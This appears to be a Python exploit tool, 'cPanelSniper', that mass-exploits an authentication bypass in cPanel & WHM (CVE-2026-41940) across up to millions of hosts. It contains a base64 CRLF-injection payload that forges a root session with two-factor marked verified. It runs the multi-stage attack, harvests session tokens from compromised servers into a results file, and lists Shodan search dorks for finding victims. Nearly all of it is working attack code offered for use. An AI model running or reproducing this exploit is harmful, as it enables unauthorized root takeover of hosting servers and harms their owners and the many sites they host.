#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cPanelSniper.py — CVE-2026-41940 cPanel & WHM Auth Bypass Scanner
Stable version optimized for large-scale scans (10M+ targets)
"""

import sys, os, re, json, ssl, signal, argparse, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import (urlsplit, quote, unquote, urlencode,
                           urlparse, parse_qs)
from collections import defaultdict
import urllib.request, urllib.error

# ══════════════════════════════════════════════════════════════
#  COLORS
# ══════════════════════════════════════════════════════════════
class C:
    RED    = "\033[91m"; GREEN  = "\033[92m"; YELLOW = "\033[93m"
    BLUE   = "\033[94m"; PURPLE = "\033[95m"; CYAN   = "\033[96m"
    BOLD   = "\033[1m";  DIM    = "\033[2m";  RESET  = "\033[0m"
    ORANGE = "\033[38;5;208m"

LOG_LOCK   = threading.Lock()
PRINT_LOCK = threading.Lock()
STATS_LOCK = threading.Lock()

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(level, msg, target=""):
    icons = {
        "CRIT":  f"{C.RED}{C.BOLD}[CRIT]{C.RESET}",
        "HIGH":  f"{C.RED}[HIGH]{C.RESET}",
        "INFO":  f"{C.BLUE}[INFO]{C.RESET}",
        "OK":    f"{C.GREEN}[  OK]{C.RESET}",
        "ERR":   f"{C.DIM}[ ERR]{C.RESET}",
        "SKIP":  f"{C.DIM}[SKIP]{C.RESET}",
        "SCAN":  f"{C.PURPLE}[SCAN]{C.RESET}",
        "STEP":  f"{C.CYAN}[{level:>4}]{C.RESET}",
        "PWNED": f"{C.RED}{C.BOLD}[PWND]{C.RESET}",
        "WARN":  f"{C.YELLOW}[WARN]{C.RESET}",
        "API":   f"{C.ORANGE}[ API]{C.RESET}",
    }.get(level, f"[{level:>4}]")
    t = f" {C.DIM}{target}{C.RESET}" if target else ""
    with LOG_LOCK:
        print(f"{C.DIM}{ts()}{C.RESET} {icons} {msg}{t}", file=sys.stderr, flush=True)

def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)

def banner():
    print(f"""{C.ORANGE}{C.BOLD}
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║
  ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║
  ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗
   ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝{C.RESET}
{C.BOLD}███████╗███╗  ██╗██╗██████╗ ███████╗██████╗{C.RESET}
{C.BOLD}██╔════╝████╗ ██║██║██╔══██╗██╔════╝██╔══██╗{C.RESET}
{C.BOLD}███████╗██╔██╗██║██║██████╔╝█████╗  ██████╔╝{C.RESET}
{C.BOLD}╚════██║██║╚████║██║██╔═══╝ ██╔══╝  ██╔══██╗{C.RESET}
{C.BOLD}███████║██║ ╚███║██║██║     ███████╗██║  ██║{C.RESET}
{C.BOLD}╚══════╝╚═╝  ╚══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝{C.RESET}
{C.CYAN}  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection{C.RESET}
{C.DIM}  STABLE VERSION — Optimized for 10M+ targets{C.RESET}
{C.RED}  In-The-Wild | CVSS 10.0 | Stable Version{C.RESET}
""")

# ══════════════════════════════════════════════════════════════
#  CRLF PAYLOAD
# ══════════════════════════════════════════════════════════════
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

# Patched versions
PATCHED = {
    "110": ("11.110.0.97",  97),
    "118": ("11.118.0.63",  63),
    "126": ("11.126.0.54",  54),
    "132": ("11.132.0.29",  29),
    "134": ("11.134.0.20",  20),
    "136": ("11.136.0.5",    5),
}

# ══════════════════════════════════════════════════════════════
#  STATS TRACKER (thread-safe)
# ══════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.scanned = 0
        self.found = 0
        self.errors = 0
        self.start_time = None

    def add_scanned(self):
        with STATS_LOCK:
            self.scanned += 1

    def add_found(self):
        with STATS_LOCK:
            self.found += 1

    def add_error(self):
        with STATS_LOCK:
            self.errors += 1

    def get(self):
        with STATS_LOCK:
            elapsed = time.time() - self.start_time if self.start_time else 0
            return {
                "scanned": self.scanned,
                "found": self.found,
                "errors": self.errors,
                "elapsed": elapsed
            }

STATS = Stats()

# ══════════════════════════════════════════════════════════════
#  HTTP ENGINE
# ══════════════════════════════════════════════════════════════
class _SSLCtx:
    _ctx = None
    @classmethod
    def get(cls):
        if not cls._ctx:
            c = ssl.create_default_context()
            c.check_hostname = False
            c.verify_mode    = ssl.CERT_NONE
            try: c.set_ciphers("DEFAULT:@SECLEVEL=1")
            except: pass
            cls._ctx = c
        return cls._ctx

BASE_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/146.0.0.0 Safari/537.36")

class R:
    """Thin response wrapper"""
    def __init__(self, status, body, headers, url, raw_cookies=""):
        self.status      = status
        self.body        = body
        self.headers     = headers
        self.url         = url
        self.raw_cookies = raw_cookies

    def h(self, k, default=""):
        return self.headers.get(k.lower(), default)

    def location(self):
        return self.h("location")

    def raw_cookie(self, name):
        for line in self.raw_cookies.split("\n"):
            if line.lower().startswith(name.lower() + "="):
                v = line.split("=", 1)[1].split(";", 1)[0].strip()
                return v
        return ""

class _NoRedir(urllib.request.HTTPErrorProcessor):
    def http_response(self, req, r): return r
    https_response = http_response

def _do(url, method="GET", extra_headers=None, data=None, timeout=15,
        follow=False, canonical_host=None):
    parsed = urlparse(url)
    h = {
        "User-Agent": BASE_UA,
        "Accept":     "*/*",
        "Connection": "close",
    }
    if canonical_host:
        port = parsed.port or (443 if parsed.scheme=="https" else 80)
        h["Host"] = f"{canonical_host}:{port}" if port not in (80,443) \
                    else canonical_host
    if extra_headers:
        h.update(extra_headers)

    body_bytes = None
    if data:
        if isinstance(data, dict):
            body_bytes = urlencode(data).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str):
            body_bytes = data.encode()
        else:
            body_bytes = data

    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=_SSLCtx.get()),
        _NoRedir() if not follow else urllib.request.HTTPSHandler(context=_SSLCtx.get()))
    opener.addheaders = []

    try:
        req = urllib.request.Request(url, data=body_bytes,
                                     headers=h, method=method)
        with opener.open(req, timeout=timeout) as resp:
            body_bytes_out = resp.read()
            body     = body_bytes_out.decode("utf-8", errors="replace")
            rh       = {}
            raw_ck   = []
            for k, v in resp.headers.items():
                rh[k.lower()] = v
                if k.lower() == "set-cookie":
                    raw_ck.append(v)
            return R(resp.status, body, rh, resp.url, "\n".join(raw_ck))
    except urllib.error.HTTPError as e:
        try:    body = e.read().decode("utf-8", errors="replace")
        except: body = ""
        rh     = {k.lower(): v for k,v in e.headers.items()} if hasattr(e,"headers") else {}
        raw_ck = []
        if hasattr(e, "headers"):
            for k,v in e.headers.items():
                if k.lower() == "set-cookie":
                    raw_ck.append(v)
        return R(e.code, body, rh, url, "\n".join(raw_ck))
    except Exception as ex:
        return R(0, str(ex), {}, url, "")

# ══════════════════════════════════════════════════════════════
#  TARGET PARSING
# ══════════════════════════════════════════════════════════════
def parse_target(url: str) -> tuple:
    if "://" not in url:
        url = "https://" + url
    u = urlsplit(url.rstrip("/"))
    scheme = u.scheme or "https"
    host   = u.hostname or url
    port   = u.port or 2087
    return scheme, host, port

def build_url(scheme, host, port, path):
    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

def is_version_patched(version: str):
    m = re.match(r"11\.(\d+)\.(\d+)\.(\d+)", version)
    if not m:
        return None
    branch, patch, build = m.group(1), int(m.group(2)), int(m.group(3))
    if branch in PATCHED:
        _, patched_build = PATCHED[branch]
        return build >= patched_build
    return None

# ══════════════════════════════════════════════════════════════
#  EXPLOIT STAGES
# ══════════════════════════════════════════════════════════════
def stage0_canonical(scheme, host, port, timeout) -> str:
    url  = build_url(scheme, host, port, "/openid_connect/cpanelid")
    resp = _do(url, timeout=timeout, follow=False)
    loc  = resp.location()
    m    = re.match(r"^https?://([^:/]+)", loc)
    if m:
        canonical = m.group(1)
        return canonical
    return host

def stage1_preauth(scheme, host, port, canonical, timeout) -> str:
    url  = build_url(scheme, host, port, "/login/?login_only=1")
    resp = _do(url, method="POST",
               data={"user": "root", "pass": "wrong"},
               timeout=timeout,
               canonical_host=canonical)

    if resp.status not in (200, 401):
        return None

    raw_ck = resp.raw_cookie("whostmgrsession")
    if not raw_ck:
        raw_ck = resp.h("set-cookie")
        m = re.search(r'whostmgrsession=([^;,\s]+)', raw_ck, re.IGNORECASE)
        raw_ck = m.group(1) if m else ""

    if not raw_ck:
        return None

    decoded = unquote(raw_ck)
    if "," in decoded:
        session_base = decoded.split(",", 1)[0]
    else:
        session_base = decoded

    return session_base

def stage2_inject(scheme, host, port, canonical, session_base, timeout) -> str:
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/")
    resp = _do(url, method="GET",
               extra_headers={
                   "Authorization": f"Basic {PAYLOAD_B64}",
                   "Cookie":        f"whostmgrsession={cookie_enc}",
               },
               timeout=timeout,
               canonical_host=canonical)

    loc = resp.location()
    m   = re.search(r"/cpsess(\d{10})", loc)
    if not m:
        return None

    token = f"/cpsess{m.group(1)}"
    return token

def stage3_propagate(scheme, host, port, canonical, session_base, timeout) -> bool:
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/scripts2/listaccts")
    resp = _do(url, method="GET",
               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
               timeout=timeout,
               canonical_host=canonical)

    body = resp.body or ""
    if resp.status == 401 and any(x in body for x in
                                   ["Token denied", "WHM Login", "login"]):
        return True

    if resp.status in (200, 301, 302, 307):
        return True

    return True

def stage4_verify(scheme, host, port, canonical, session_base, token, timeout) -> dict:
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, f"{token}/json-api/version")
    resp = _do(url, method="GET",
               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
               timeout=timeout,
               canonical_host=canonical)

    body = (resp.body or "").strip()

    if resp.status == 200 and '"version"' in body:
        version = ""
        m = re.search(r'"version"\s*:\s*"([^"]+)"', body)
        if m:
            version = m.group(1)
        return {"confirmed": True, "version": version, "body": body[:600]}

    if resp.status in (500, 503) and "License" in body:
        return {"confirmed": True, "version": "unknown (license-gated)",
                "body": body[:300]}

    return {"confirmed": False}

# ══════════════════════════════════════════════════════════════
#  FINDINGS STORE (thread-safe, periodic save)
# ══════════════════════════════════════════════════════════════
class FindingsStore:
    def __init__(self, output_file=None, save_interval=60):
        self._f = []
        self._seen = set()
        self._lock = threading.Lock()
        self._output_file = output_file
        self._save_interval = save_interval
        self._last_save = time.time()

    def add(self, f):
        k = f"{f.get('target','')}::{f.get('version','')}"
        with self._lock:
            if k in self._seen: return
            self._seen.add(k); self._f.append(f)

            # Periodic save to disk
            if self._output_file and (time.time() - self._last_save) > self._save_interval:
                self._save_to_disk()

    def _save_to_disk(self):
        if not self._output_file:
            return
        try:
            os.makedirs(os.path.dirname(self._output_file) if os.path.dirname(self._output_file) else ".", exist_ok=True)
            with open(self._output_file, "w", encoding="utf-8") as f:
                json.dump({"scanner":"cPanelSniper Stable","cve":"CVE-2026-41940",
                           "timestamp": datetime.now().isoformat(),
                           "findings": self._f}, f, indent=2, ensure_ascii=False)
            self._last_save = time.time()
        except Exception as e:
            log("WARN", f"Failed to save findings: {e}")

    def all(self):
        with self._lock:
            return list(self._f)

    def count(self):
        with self._lock:
            c = defaultdict(int)
            for f in self._f: c[f.get("severity","INFO")] += 1
            return dict(c)

    def finalize(self):
        """Final save before exit"""
        self._save_to_disk()

STORE = FindingsStore()

# ══════════════════════════════════════════════════════════════
#  PROGRESS DISPLAY
# ══════════════════════════════════════════════════════════════
def show_progress(total_scanned, total_targets):
    stats = STATS.get()
    elapsed = stats["elapsed"]
    rate = stats["scanned"] / elapsed if elapsed > 0 else 0
    eta = (total_targets - total_scanned) / rate if rate > 0 else 0

    progress = (total_scanned / total_targets * 100) if total_targets > 0 else 0
    sys.stderr.write(f"\r{C.CYAN}[PROG]{C.RESET} "
                     f"Scanned: {C.GREEN}{total_scanned}/{total_targets}{C.RESET} "
                     f"({progress:.1f}%) | "
                     f"Found: {C.RED}{stats['found']}{C.RESET} | "
                     f"Errors: {C.YELLOW}{stats['errors']}{C.RESET} | "
                     f"Rate: {rate:.1f}/s | "
                     f"ETA: {eta/60:.1f}min")
    sys.stderr.flush()

# ══════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ══════════════════════════════════════════════════════════════
def scan(target: str, args) -> dict:
    try:
        if "://" not in target:
            target = "https://" + target
        target = target.rstrip("/")
        result = {"target": target, "vuln": False}

        scheme, host, port = parse_target(target)
        timeout = args.timeout

        canonical = args.hostname or stage0_canonical(scheme, host, port, timeout)
        if not canonical:
            canonical = host

        session_base = stage1_preauth(scheme, host, port, canonical, timeout)
        if not session_base:
            return result

        token = stage2_inject(scheme, host, port, canonical, session_base, timeout)
        if not token:
            return result

        stage3_propagate(scheme, host, port, canonical, session_base, timeout)

        verify = stage4_verify(scheme, host, port, canonical,
                               session_base, token, timeout)

        if not verify.get("confirmed"):
            return result

        version = verify.get("version", "unknown")
        patched = is_version_patched(version)

        log("PWNED", f"CVE-2026-41940 CONFIRMED", target)

        finding = {
            "severity":   "CRIT",
            "title":      "CVE-2026-41940 — cPanel & WHM Authentication Bypass",
            "target":     target,
            "canonical":  canonical,
            "session":    session_base,
            "token":      token,
            "version":    version,
            "api_url":    build_url(scheme, host, port, f"{token}/json-api/version"),
            "evidence":   verify.get("body","")[:400],
            "cve":        "CVE-2026-41940",
            "cvss":       "10.0",
            "timestamp":  datetime.now().isoformat(),
        }
        STORE.add(finding)
        STATS.add_found()
        result["vuln"] = True
        result["finding"] = finding

        return result

    except Exception as e:
        STATS.add_error()
        return {"target": target, "vuln": False, "error": str(e)}

    finally:
        STATS.add_scanned()

# ══════════════════════════════════════════════════════════════
#  TARGET READER (memory-efficient)
# ══════════════════════════════════════════════════════════════
def read_targets_from_file(file_path, chunk_size=10000):
    """Generator that reads targets in chunks to save memory"""
    chunk = []
    seen = set()

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            # Extract URL if line contains extra info
            m = re.search(r'(https?://[a-zA-Z0-9._:/?&=%-]+)', line)
            if m:
                url = m.group(1).rstrip("[].,")
            else:
                url = line

            if url and url not in seen:
                seen.add(url)
                chunk.append(url)

                if len(chunk) >= chunk_size:
                    yield chunk
                    chunk = []

        if chunk:
            yield chunk

def read_targets_from_stdin():
    """Read targets from stdin"""
    ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
    seen = set()

    for line in sys.stdin:
        clean = ANSI_RE.sub("", line).strip()
        m = re.search(r"(https?://[a-zA-Z0-9._:/?&=%-]+)", clean)
        if m:
            url = m.group(1).rstrip("[].,")
        elif re.match(r"^(\d{1,3}(?:\.\d{1,3}){3})\s+(\d+)$", clean):
            parts = clean.split()
            url = f"https://{parts[0]}:{parts[1]}"
        else:
            continue

        if url and url not in seen:
            seen.add(url)
            yield url

# ══════════════════════════════════════════════════════════════
#  BULK SCANNER (memory-efficient for 10M+ targets)
# ══════════════════════════════════════════════════════════════
def bulk_scan(targets_generator, args):
    total_scanned = 0
    total_targets = 0

    # First pass: count total targets if reading from file
    if args.list:
        try:
            with open(args.list, 'r', encoding='utf-8', errors='ignore') as f:
                total_targets = sum(1 for line in f if line.strip() and not line.startswith('#'))
        except:
            total_targets = 0

    STATS.start_time = time.time()
    print(f"{C.CYAN}[INFO]{C.RESET} Starting bulk scan...")

    for chunk in targets_generator:
        chunk_size = len(chunk)
        print(f"\n{C.CYAN}[INFO]{C.RESET} Processing chunk of {chunk_size} targets...")

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(scan, t, args): t for t in chunk}

            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    STATS.add_error()
                    log("WARN", f"Scan error: {e}")

                total_scanned += 1
                show_progress(total_scanned, total_targets)

        # Small delay between chunks to prevent system overload
        if args.rate_limit:
            time.sleep(args.rate_limit)

    print(f"\n{C.GREEN}[DONE]{C.RESET} Scan complete!\n")

# ══════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════
def print_summary(elapsed: float, total: int):
    findings = STORE.all()
    stats = STATS.get()
    W = 70
    print(f"\n{C.BOLD}{'═'*W}{C.RESET}")
    print(f"{C.BOLD}  cPanelSniper STABLE — CVE-2026-41940 Scan Complete{C.RESET}")
    print(f"  {C.DIM}Time: {elapsed:.1f}s  ·  Targets: {total}{C.RESET}")
    print(f"  {C.DIM}Scanned: {stats['scanned']}  ·  Found: {stats['found']}  ·  Errors: {stats['errors']}{C.RESET}")
    print(f"  {C.DIM}Rate: {stats['scanned']/elapsed:.1f} targets/sec{C.RESET}" if elapsed > 0 else "")
    print(f"{'─'*W}")
    if not findings:
        print(f"  {C.DIM}No vulnerable targets found.{C.RESET}")
    else:
        print(f"\n  {C.RED}{C.BOLD}⚡ {len(findings)} VULNERABLE TARGET(S){C.RESET}\n")
        for f in findings:
            print(f"  {C.RED}{C.BOLD}Target   :{C.RESET} {f['target']}")
            print(f"  {C.CYAN}Version  :{C.RESET} {f['version']}")
            print(f"  {C.CYAN}Token    :{C.RESET} {f['token']}")
            print(f"  {C.GREEN}API URL  :{C.RESET} {f['api_url']}")
            print(f"  {C.DIM}Session  : {f['session'][:45]}...{C.RESET}")
            ev = f.get("evidence","")[:200].replace("\n"," ")
            print(f"  {C.GREEN}Evidence : {ev}{C.RESET}\n")
    print(f"{'═'*W}{C.RESET}\n")

# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════
def main():
    banner()
    p = argparse.ArgumentParser(
        description="cPanelSniper STABLE — CVE-2026-41940 cPanel/WHM Auth Bypass",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Shodan dorks:
  title:"WHM Login"
  title:"WebHost Manager" port:2087
  product:"cPanel" port:2087

Examples:
  python3 cPanelSniper.py -u https://target.com:2087
  python3 cPanelSniper.py -l targets.txt -t 50 -o results.json
  cat urls.txt | python3 cPanelSniper.py -t 30
        """
    )
    tg = p.add_argument_group("Target")
    tg.add_argument("-u","--url",      help="Single target URL (e.g. https://host:2087)")
    tg.add_argument("-l","--list",     help="File with URLs (one per line)")
    tg.add_argument("--hostname",      help="Override canonical Host header")

    sg = p.add_argument_group("Scan")
    sg.add_argument("-t","--threads",  type=int, default=10, help="Threads (default: 10)")
    sg.add_argument("--timeout",       type=int, default=15, help="Timeout seconds (default: 15)")
    sg.add_argument("--rate-limit",    type=float, default=0, help="Delay between targets")
    sg.add_argument("--chunk-size",    type=int, default=10000, help="Targets per chunk (default: 10000)")

    og = p.add_argument_group("Output")
    og.add_argument("-o","--output",   help="Save results to JSON file")
    og.add_argument("--no-color",      action="store_true", help="Disable ANSI colors")
    og.add_argument("--save-interval", type=int, default=60, help="Save results every N seconds")

    args = p.parse_args()

    if args.no_color:
        for a in [x for x in dir(C) if not x.startswith("_")]:
            setattr(C, a, "")

    # Configure store
    if args.output:
        STORE._output_file = args.output
        STORE._save_interval = args.save_interval

    print(f"{C.PURPLE}  Configuration:{C.RESET}")
    print(f"   Threads    : {args.threads}")
    print(f"   Timeout    : {args.timeout}s")
    print(f"   Chunk Size : {args.chunk_size}")
    print(f"   Rate Limit : {args.rate_limit}s")
    print(f"   Output     : {args.output or 'stdout'}")
    print()

    t0 = time.time()

    # Single target mode
    if args.url:
        STATS.start_time = time.time()
        result = scan(args.url, args)
        if args.output:
            STORE.finalize()
        print_summary(time.time()-t0, 1)
        sys.exit(0)

    # Bulk scan mode
    if args.list:
        generator = read_targets_from_file(args.list, chunk_size=args.chunk_size)
        bulk_scan(generator, args)
    elif not sys.stdin.isatty():
        # Convert stdin to list for progress tracking
        targets = list(read_targets_from_stdin())
        print(f"{C.CYAN}[INFO]{C.RESET} Loaded {len(targets)} targets from stdin")

        # Process in chunks
        for i in range(0, len(targets), args.chunk_size):
            chunk = targets[i:i+args.chunk_size]
            print(f"\n{C.CYAN}[INFO]{C.RESET} Processing chunk {i//args.chunk_size + 1} ({len(chunk)} targets)...")

            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = {executor.submit(scan, t, args): t for t in chunk}

                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        STATS.add_error()
                        log("WARN", f"Scan error: {e}")

                    show_progress(min(i + len(futures), len(targets)), len(targets))

            if args.rate_limit:
                time.sleep(args.rate_limit)

        print(f"\n{C.GREEN}[DONE]{C.RESET} Scan complete!\n")
    else:
        p.print_help()
        sys.exit(1)

    if args.output:
        STORE.finalize()

    stats = STATS.get()
    print_summary(time.time()-t0, stats['scanned'])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrupted. Saving results...{C.RESET}")
        if STORE._output_file:
            STORE.finalize()
        stats = STATS.get()
        print_summary(time.time() - (STATS.start_time or time.time()), stats['scanned'])
        sys.exit(0)
